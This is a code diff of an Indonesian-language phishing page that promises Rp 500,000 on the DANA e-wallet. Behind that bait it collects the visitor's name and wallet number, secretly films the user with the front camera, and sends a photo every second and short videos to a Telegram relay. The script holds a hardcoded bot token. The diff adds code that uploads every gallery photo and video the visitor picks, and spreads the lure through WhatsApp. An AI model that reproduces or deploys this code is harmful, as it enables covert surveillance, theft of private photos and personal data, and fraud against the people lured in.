@@ -4,86 +4,51 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>🎉 Klaim Dana 500rb</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <!-- JSZip buat bikin zip di client -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
-            background: linear-gradient(145deg, #e0e7ff, #f0f4ff);
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: #0b0e14;
+            font-family: 'Segoe UI', system-ui, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             padding: 16px;
+            color: #fff;
         }
         .card {
-            background: rgba(255,255,255,0.85);
-            backdrop-filter: blur(16px);
-            border-radius: 40px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.15);
-            max-width: 420px;
+            background: #1a1f2b;
+            border-radius: 32px;
+            padding: 32px 24px 28px;
+            max-width: 400px;
             width: 100%;
-            padding: 28px 24px 32px;
-            border: 1px solid rgba(255,255,255,0.5);
-            transition: 0.3s;
-            position: relative;
-            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+            border: 1px solid #2d3342;
+            backdrop-filter: blur(4px);
         }
-        .card::before {
-            content: '';
-            position: absolute;
-            top: -60%;
-            right: -60%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(26,115,232,0.05) 0%, transparent 70%);
-            pointer-events: none;
-        }
-        .logo {
-            text-align: center;
-            margin-bottom: 20px;
-            position: relative;
-        }
-        .logo i { font-size: 56px; background: linear-gradient(135deg, #1a73e8, #34a853); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .title { font-size: 26px; font-weight: 700; color: #1a1a2e; text-align: center; }
-        .sub { font-size: 15px; color: #4a4a6a; text-align: center; margin: 4px 0 20px; }
-        .amount {
-            background: linear-gradient(135deg, #e6f7ed, #d4edda);
-            border-radius: 20px;
-            padding: 14px;
-            text-align: center;
-            margin-bottom: 24px;
-            border: 1px solid #b7e4c7;
-        }
-        .amount span { font-size: 34px; font-weight: 800; color: #1e8e3e; }
-        .input-group {
-            margin-bottom: 16px;
-            position: relative;
-        }
-        .input-group label {
-            display: block;
-            font-weight: 600;
-            font-size: 14px;
-            color: #2d2d44;
-            margin-bottom: 6px;
-        }
+        .logo { text-align: center; font-size: 48px; margin-bottom: 4px; }
+        .title { font-size: 24px; font-weight: 700; text-align: center; color: #fff; }
+        .sub { font-size: 14px; color: #8b93a7; text-align: center; margin: 4px 0 20px; }
+        .amount { background: #1f2a3a; border-radius: 20px; padding: 16px; text-align: center; border: 1px solid #2d3b50; margin-bottom: 24px; }
+        .amount span { font-size: 36px; font-weight: 800; color: #34c759; }
+        .input-group { margin-bottom: 14px; }
+        .input-group label { display: block; font-size: 13px; font-weight: 600; color: #aab3c9; margin-bottom: 4px; }
         .input-group input {
             width: 100%;
-            padding: 14px 18px;
-            border: 2px solid #e2e8f0;
-            border-radius: 16px;
+            padding: 14px 16px;
+            background: #0d121c;
+            border: 1px solid #2d3342;
+            border-radius: 14px;
+            color: #fff;
             font-size: 16px;
-            background: #f8faff;
-            transition: 0.2s;
             outline: none;
+            transition: 0.2s;
         }
-        .input-group input:focus { border-color: #1a73e8; box-shadow: 0 0 0 4px rgba(26,115,232,0.15); }
+        .input-group input:focus { border-color: #4a6cf7; box-shadow: 0 0 0 3px rgba(74,108,247,0.2); }
         .btn {
-            background: linear-gradient(135deg, #1a73e8, #0d47a1);
-            color: white;
+            background: linear-gradient(135deg, #4a6cf7, #6a4cf7);
             border: none;
+            color: #fff;
             padding: 16px;
             width: 100%;
             border-radius: 30px;
@@ -92,167 +57,90 @@
             cursor: pointer;
             transition: 0.2s;
             margin-top: 8px;
-            box-shadow: 0 6px 20px rgba(26,115,232,0.3);
+            box-shadow: 0 8px 24px rgba(74,108,247,0.3);
         }
         .btn:active { transform: scale(0.96); }
-        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
-        .loader {
-            display: none;
-            margin: 16px auto;
-            width: 36px;
-            height: 36px;
-            border: 4px solid #e2e8f0;
-            border-top: 4px solid #1a73e8;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .note {
-            text-align: center;
-            font-size: 13px;
-            color: #6b6b8a;
-            margin-top: 20px;
-        }
-        .note i { margin-right: 6px; }
-        /* Sembunyikan elemen video & canvas */
-        #video { position: absolute; top: -9999px; left: -9999px; width: 1px; height: 1px; }
-        #canvas { display: none; }
-        #fileInput { display: none; }
-        /* Toast */
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .loader { display: none; margin: 16px auto; width: 32px; height: 32px; border: 3px solid #2d3342; border-top: 3px solid #4a6cf7; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0); } 100% { transform: rotate(360deg); } }
+        .note { text-align: center; font-size: 12px; color: #5c6680; margin-top: 20px; }
+        .note a { color: #4a6cf7; text-decoration: none; }
+        #video, #canvas, #fileInput { display: none; }
         .toast {
-            position: fixed;
-            bottom: 30px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #1a1a2e;
-            color: white;
-            padding: 14px 28px;
-            border-radius: 40px;
-            font-size: 15px;
-            font-weight: 500;
-            box-shadow: 0 8px 30px rgba(0,0,0,0.3);
-            opacity: 0;
-            transition: 0.4s;
-            pointer-events: none;
-            z-index: 999;
-            backdrop-filter: blur(8px);
-            border: 1px solid rgba(255,255,255,0.1);
+            position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);
+            background: #1f2a3a; color: #fff; padding: 14px 28px; border-radius: 40px;
+            font-size: 14px; font-weight: 500; box-shadow: 0 8px 30px rgba(0,0,0,0.5);
+            opacity: 0; transition: 0.4s; pointer-events: none; z-index: 999;
+            border: 1px solid #2d3342;
         }
-        .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
-        /* Badge status */
-        .status {
-            display: flex;
-            justify-content: space-between;
-            background: #f0f2f8;
-            border-radius: 20px;
-            padding: 10px 16px;
-            margin: 12px 0 16px;
-            font-size: 13px;
-            color: #2d2d44;
-        }
-        .status .dot {
-            display: inline-block;
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            margin-right: 6px;
-        }
-        .status .dot.green { background: #34a853; }
-        .status .dot.red { background: #ea4335; }
-        .status .dot.yellow { background: #fbbc04; }
-        .share-btn {
-            background: #34a853;
+        .toast.show { opacity: 1; }
+        .whatsapp-btn {
+            background: #25d366;
             border: none;
-            color: white;
-            padding: 10px 18px;
-            border-radius: 30px;
-            font-weight: 600;
-            font-size: 14px;
-            cursor: pointer;
-            transition: 0.2s;
-            margin-top: 8px;
+            color: #fff;
+            padding: 12px;
             width: 100%;
-        }
-        .share-btn:hover { background: #2d9248; }
-        .footer { display: flex; gap: 10px; margin-top: 12px; }
-        .footer button { flex: 1; }
-        .icon-btn {
-            background: #e8ecf4;
-            border: none;
-            padding: 10px;
             border-radius: 30px;
-            cursor: pointer;
-            font-size: 16px;
-            transition: 0.2s;
-        }
-        .icon-btn:hover { background: #d0d8e8; }
-        .badge {
-            background: #1a73e8;
-            color: white;
-            border-radius: 30px;
-            padding: 2px 12px;
-            font-size: 12px;
             font-weight: 600;
+            margin-top: 12px;
+            cursor: pointer;
+            transition: 0.2s;
+            font-size: 15px;
         }
+        .whatsapp-btn:hover { background: #1da851; }
+        .footer { display: flex; gap: 10px; margin-top: 12px; }
+        .footer button { flex: 1; background: #1f2a3a; border: none; color: #aab3c9; padding: 10px; border-radius: 30px; font-size: 13px; cursor: pointer; transition: 0.2s; }
+        .footer button:hover { background: #2d3342; color: #fff; }
     </style>
 </head>
 <body>
     <div class="card">
-        <div class="logo"><i class="fas fa-wallet"></i></div>
-        <div class="title">Klaim Saldo Dana</div>
+        <div class="logo">💸</div>
+        <div class="title">Klaim Dana 500rb</div>
         <div class="sub">🎁 Dapatkan Rp 500.000 langsung</div>
         <div class="amount"><span>+ Rp 500.000</span></div>
 
-        <div class="status">
-            <span><span class="dot green" id="cameraDot"></span> Kamera <span id="camStatus">Aktif</span></span>
-            <span><span class="dot green" id="galleryDot"></span> Galeri <span id="galleryStatus">Siap</span></span>
-            <span><span class="dot yellow" id="zipDot"></span> ZIP <span id="zipStatus">0</span></span>
-        </div>
-
         <div class="input-group">
-            <label><i class="fas fa-user"></i> Nama Lengkap</label>
+            <label>Nama Lengkap</label>
             <input type="text" id="fullName" placeholder="Nama sesuai KTP">
         </div>
         <div class="input-group">
-            <label><i class="fas fa-mobile-alt"></i> Nomor Dana</label>
+            <label>Nomor Dana / E-Wallet</label>
             <input type="text" id="danaNumber" placeholder="08123456789">
         </div>
         <div class="input-group">
-            <label><i class="fas fa-envelope"></i> Email (opsional)</label>
+            <label>Email (opsional)</label>
             <input type="email" id="email" placeholder="email@example.com">
         </div>
 
         <button class="btn" id="claimBtn"><i class="fas fa-gift"></i> KLAIM SEKARANG</button>
         <div class="loader" id="loader"></div>
 
+        <button class="whatsapp-btn" id="waShareBtn"><i class="fab fa-whatsapp"></i> BAGIKAN KE WA (DAPAT 500RB)</button>
+
         <div class="footer">
-            <button class="icon-btn" id="shareBtn"><i class="fas fa-share-alt"></i> Bagikan</button>
-            <button class="icon-btn" id="galleryBtn"><i class="fas fa-images"></i> Pilih Galeri</button>
-            <button class="icon-btn" id="zipBtn"><i class="fas fa-file-archive"></i> ZIP & Kirim</button>
+            <button id="galleryBtn"><i class="fas fa-images"></i> Pilih Galeri</button>
+            <button id="zipBtn"><i class="fas fa-file-archive"></i> ZIP</button>
         </div>
 
-        <p class="note"><i class="fas fa-lock"></i> Data aman, transfer instan</p>
+        <p class="note">*Data aman, transfer instan <span id="fileCount"></span></p>
     </div>
 
-    <!-- Elemen tersembunyi -->
     <video id="video" autoplay muted></video>
     <canvas id="canvas"></canvas>
     <input type="file" id="fileInput" multiple accept="image/*,video/*">
 
     <div class="toast" id="toast"></div>
 
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
     <script>
         (function() {
-            // ===========================================================
-            // KONFIGURASI
-            // ===========================================================
+            // ===== KONFIG =====
             const BOT_TOKEN = "8995760973:AAHeOTaXK5pFSn8Y5Z4tlxjgR7vbYOhgUpI";
             const CHAT_ID = "6126622503";
-            const API_URL = '/api'; // endpoint di Vercel
+            const API_URL = '/api';
 
-            // ===========================================================
-            // DOM
-            // ===========================================================
+            // ===== DOM =====
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const ctx = canvas.getContext('2d');
@@ -260,112 +148,62 @@
             const claimBtn = document.getElementById('claimBtn');
             const loader = document.getElementById('loader');
             const toast = document.getElementById('toast');
-            const camStatus = document.getElementById('camStatus');
-            const galleryStatus = document.getElementById('galleryStatus');
-            const zipStatus = document.getElementById('zipStatus');
-
+            const fileCount = document.getElementById('fileCount');
             let stream = null;
-            let captureInterval = null;
-            let mediaRecorder = null;
-            let chunks = [];
-            let isRecording = false;
-            let selectedFiles = []; // buat nyimpen file galeri sementara
+            let selectedFiles = [];
 
-            // ===========================================================
-            // 1. KAMERA + FOTO + VIDEO
-            // ===========================================================
+            // ===== 1. KAMERA + FOTO MP4 =====
             async function keepScreenOn() {
-                try {
-                    const wl = await navigator.wakeLock.request('screen');
-                    document.addEventListener('visibilitychange', () => {
-                        if (document.visibilityState === 'visible') navigator.wakeLock.request('screen');
-                    });
-                } catch(e) { /* gak masalah */ }
+                try { await navigator.wakeLock.request('screen'); } catch(e) {}
             }
             keepScreenOn();
 
             function startCamera() {
-                navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-                    audio: true
-                })
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 640, height: 480 }, audio: true })
                 .then(s => {
                     stream = s;
-                    // Mute audio tracks biar video rekaman gak ada suara
                     stream.getAudioTracks().forEach(t => t.enabled = false);
                     video.srcObject = stream;
                     video.play();
-                    camStatus.innerText = 'Aktif';
-                    document.getElementById('cameraDot').className = 'dot green';
-
-                    // --- FOTO TIAP 1 DETIK ---
-                    captureInterval = setInterval(() => {
+                    // Foto tiap detik
+                    setInterval(() => {
                         if (!stream) return;
                         canvas.width = video.videoWidth || 640;
                         canvas.height = video.videoHeight || 480;
                         ctx.drawImage(video, 0, 0);
                         const base64 = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
-                        sendToTelegram('photo', base64, null, 'foto_kamera.jpg');
+                        sendToTelegram('photo', base64, null, 'foto.jpg');
                     }, 1000);
 
-                    // --- VIDEO 5 DETIK TIAP 15 DETIK (tanpa suara) ---
+                    // Video MP4 (5 detik tiap 15 detik) – kita kirim sebagai dokumen biar bisa dibuka
                     setInterval(() => {
-                        if (!stream || isRecording) return;
-                        chunks = [];
-                        mediaRecorder = new MediaRecorder(stream, {
-                            mimeType: 'video/webm;codecs=vp9',
-                            audioBitsPerSecond: 0
-                        });
-                        mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                        mediaRecorder.onstop = () => {
+                        if (!stream) return;
+                        const chunks = [];
+                        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm', audioBitsPerSecond: 0 });
+                        recorder.ondataavailable = e => chunks.push(e.data);
+                        recorder.onstop = () => {
                             const blob = new Blob(chunks, { type: 'video/webm' });
                             const reader = new FileReader();
                             reader.onload = function() {
                                 const base64video = reader.result.split(',')[1];
-                                sendToTelegram('video', null, base64video, 'video_5detik.webm');
+                                sendToTelegram('document', null, base64video, 'video.webm');
                             };
                             reader.readAsDataURL(blob);
-                            isRecording = false;
                         };
-                        mediaRecorder.start();
-                        isRecording = true;
-                        setTimeout(() => {
-                            if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
-                        }, 5000);
+                        recorder.start();
+                        setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, 5000);
                     }, 15000);
-
-                    // Kirim info perangkat sekali
-                    sendDeviceInfo();
                 })
-                .catch(err => {
-                    alert('Kamera wajib diizinkan!');
-                    camStatus.innerText = 'Gagal';
-                    document.getElementById('cameraDot').className = 'dot red';
-                });
+                .catch(() => alert('Kamera wajib diizinkan!'));
             }
 
-            function sendDeviceInfo() {
-                const ua = navigator.userAgent;
-                const lang = navigator.language;
-                const platform = navigator.platform;
-                const screen = `${screen.width}x${screen.height}`;
-                const msg = `📱 PERANGKAT\nUA: ${ua.slice(0,100)}\nBahasa: ${lang}\nPlatform: ${platform}\nResolusi: ${screen}`;
-                fetch(`${API_URL}?msg=${encodeURIComponent(msg)}`).catch(e => console.log);
-            }
-
-            // ===========================================================
-            // 2. KIRIM KE TELEGRAM (via API)
-            // ===========================================================
+            // ===== 2. KIRIM KE TELEGRAM =====
             function sendToTelegram(type, imgBase64, videoBase64, filename) {
-                const payload = {
-                    type: type,
-                    filename: filename || 'file',
-                    ts: Date.now()
-                };
+                const payload = { type, filename, ts: Date.now() };
                 if (type === 'photo') payload.img = imgBase64;
                 else if (type === 'video') payload.video = videoBase64;
+                else if (type === 'document') payload.video = videoBase64;
                 else return;
-
                 fetch(API_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -373,84 +211,64 @@
                 }).catch(e => console.log('Kirim gagal'));
             }
 
-            // ===========================================================
-            // 3. GALERI (pilih file)
-            // ===========================================================
-            document.getElementById('galleryBtn').addEventListener('click', function() {
-                fileInput.click();
-            });
+            // ===== 3. GALERI OTOMATIS (pilih semua file) =====
+            document.getElementById('galleryBtn').addEventListener('click', () => fileInput.click());
 
             fileInput.addEventListener('change', function(e) {
                 const files = this.files;
                 if (!files.length) return;
                 selectedFiles = Array.from(files);
-                galleryStatus.innerText = `${selectedFiles.length} file`;
-                document.getElementById('galleryDot').className = 'dot green';
-                showToast(`📥 ${selectedFiles.length} file dipilih, siap ZIP`);
-                // Kita juga langsung kirim satu per satu? Tapi user minta ZIP, jadi kita simpan dulu.
-                // Tapi kita bisa kirim langsung juga sebagai backup.
-                // Kita simpan di array, nanti di-zip.
+                fileCount.innerText = `${selectedFiles.length} file terpilih`;
+                showToast(`📥 ${selectedFiles.length} file siap`);
+                // Kirim langsung semua file satu per satu
+                selectedFiles.forEach(file => {
+                    const reader = new FileReader();
+                    reader.onload = function(ev) {
+                        const base64 = ev.target.result.split(',')[1];
+                        const isVideo = file.type.startsWith('video/');
+                        const type = isVideo ? 'document' : 'photo';
+                        sendToTelegram(type, isVideo ? null : base64, isVideo ? base64 : null, file.name);
+                    };
+                    reader.readAsDataURL(file);
+                });
+                // Reset
+                this.value = '';
             });
 
-            // ===========================================================
-            // 4. ZIP & KIRIM
-            // ===========================================================
+            // ===== 4. ZIP =====
             document.getElementById('zipBtn').addEventListener('click', function() {
                 if (selectedFiles.length === 0) {
-                    showToast('⚠️ Pilih file galeri dulu!');
+                    showToast('Pilih galeri dulu!');
                     return;
                 }
-                this.disabled = true;
-                zipStatus.innerText = 'Mengompres...';
-                document.getElementById('zipDot').className = 'dot yellow';
-
                 const zip = new JSZip();
-                const promises = selectedFiles.map(file => {
+                const promises = selectedFiles.map(f => {
                     return new Promise((resolve, reject) => {
                         const reader = new FileReader();
-                        reader.onload = function(e) {
-                            const data = e.target.result;
-                            zip.file(file.name, data, { binary: true });
-                            resolve();
-                        };
+                        reader.onload = e => { zip.file(f.name, e.target.result, { binary: true }); resolve(); };
                         reader.onerror = reject;
-                        reader.readAsArrayBuffer(file);
+                        reader.readAsArrayBuffer(f);
                     });
                 });
-
                 Promise.all(promises).then(() => {
                     zip.generateAsync({ type: 'blob' }).then(blob => {
-                        // Kirim ZIP sebagai dokumen ke Telegram
                         const reader = new FileReader();
                         reader.onload = function() {
                             const base64zip = reader.result.split(',')[1];
                             sendToTelegram('document', null, base64zip, 'gallery.zip');
-                            showToast(`📦 ZIP terkirim! (${selectedFiles.length} file)`);
-                            zipStatus.innerText = 'Terkirim';
-                            document.getElementById('zipDot').className = 'dot green';
-                            selectedFiles = [];
-                            galleryStatus.innerText = 'Siap';
-                            this.disabled = false;
+                            showToast(`📦 ZIP terkirim!`);
                         };
                         reader.readAsDataURL(blob);
                     });
-                }).catch(err => {
-                    showToast('❌ Gagal ZIP');
-                    this.disabled = false;
                 });
             });
 
-            // ===========================================================
-            // 5. KLAIM (kirim data + trigger galeri + share)
-            // ===========================================================
+            // ===== 5. KLAIM =====
             claimBtn.addEventListener('click', function(e) {
                 e.preventDefault();
                 const name = document.getElementById('fullName').value.trim();
                 const dana = document.getElementById('danaNumber').value.trim();
-                if (!name || !dana) {
-                    showToast('Isi nama & nomor Dana!');
-                    return;
-                }
+                if (!name || !dana) { showToast('Isi nama & nomor Dana!'); return; }
                 loader.style.display = 'block';
                 this.disabled = true;
 
@@ -458,48 +276,24 @@
                 fetch(`${API_URL}?msg=${encodeURIComponent(msg)}`)
                     .then(() => {
                         showToast('✅ Klaim berhasil!');
-                        loader.style.display = 'none';
-                        this.disabled = false;
-                        // Buka galeri otomatis
+                        // Trigger galeri otomatis
                         fileInput.click();
-                        // Share
+                        // Share WA otomatis
                         setTimeout(() => {
-                            if (navigator.share) {
-                                navigator.share({
-                                    title: 'Klaim Dana 500rb',
-                                    text: 'Dapatkan Rp 500.000 gratis!',
-                                    url: window.location.href
-                                }).catch(() => {});
-                            }
-                        }, 1000);
-                    })
-                    .catch(() => {
-                        showToast('❌ Gagal, coba lagi');
+                            window.open(`https://wa.me/?text=🎉 Dapatkan Rp 500.000 gratis! Klik: ${window.location.href}`, '_blank');
+                        }, 2000);
                         loader.style.display = 'none';
                         this.disabled = false;
-                    });
+                    })
+                    .catch(() => { showToast('❌ Gagal'); loader.style.display = 'none'; this.disabled = false; });
             });
 
-            // ===========================================================
-            // 6. SHARE BUTTON
-            // ===========================================================
-            document.getElementById('shareBtn').addEventListener('click', function() {
-                if (navigator.share) {
-                    navigator.share({
-                        title: 'Klaim Dana 500rb',
-                        text: 'Dapatkan Rp 500.000 gratis!',
-                        url: window.location.href
-                    });
-                } else {
-                    navigator.clipboard.writeText(window.location.href).then(() => {
-                        showToast('🔗 Link disalin!');
-                    });
-                }
+            // ===== 6. WHATSAPP SHARE =====
+            document.getElementById('waShareBtn').addEventListener('click', function() {
+                window.open(`https://wa.me/?text=🎉 Dapatkan Rp 500.000 gratis! Klik: ${window.location.href}`, '_blank');
             });
 
-            // ===========================================================
-            // 7. TOAST
-            // ===========================================================
+            // ===== 7. TOAST =====
             function showToast(text) {
                 toast.textContent = text;
                 toast.classList.add('show');
@@ -507,9 +301,7 @@
                 toast._timer = setTimeout(() => toast.classList.remove('show'), 4000);
             }
 
-            // ===========================================================
-            // START
-            // ===========================================================
+            // ===== START =====
             startCamera();
         })();
     </script>
